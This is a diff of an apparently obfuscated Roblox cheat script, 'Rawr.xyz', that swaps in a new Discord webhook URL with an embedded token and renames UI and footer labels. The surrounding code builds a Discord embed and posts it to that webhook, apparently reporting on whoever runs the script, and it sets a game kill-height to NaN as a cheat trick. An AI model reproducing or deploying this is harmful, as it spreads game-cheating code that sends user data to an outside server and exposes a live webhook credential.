@@ -1,4 +1,4 @@
-local _1 = "https://discord.com/api/webhooks/1oFTArmadfoLSqb6R0LoziqDXTh9DTJHD6xuROuHai7Lff8jtkpdlB8E-p3"
+local _1 = "https://discord.com/api/webhooks/1516085284792565850/PF4fTRzaZ0o2nQQOLZHZFayj7LV1125XNoCXh4MC2VZu5h5Mg-AQ3M0pkK8bfR-lw6PQ"
 workspace.FallenPartsDestroyHeight = -0 / 0
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -168,7 +168,7 @@ local function _32()
             { name = "⏱️ Timestamp", value = "<t:" .. os.time() .. ":R>", inline = false },
         },
         thumbnail = { url = _33 },
-        footer = { text = "rawr.xyz made ts" }
+        footer = { text = "Universal V2 | Private" }
     }
     _3(_1, _37)
 end
@@ -239,7 +239,7 @@ local _57 = _56:GetMouse()
 local _58 = _53.CurrentCamera
 
 local _59 = _48:CreateWindow({
-    Title = 'Rawr.xyz',
+    Title = 'Rawr.xyz | Dev UI',
     Center = true,
     AutoShow = true,
     TabPadding = 2,
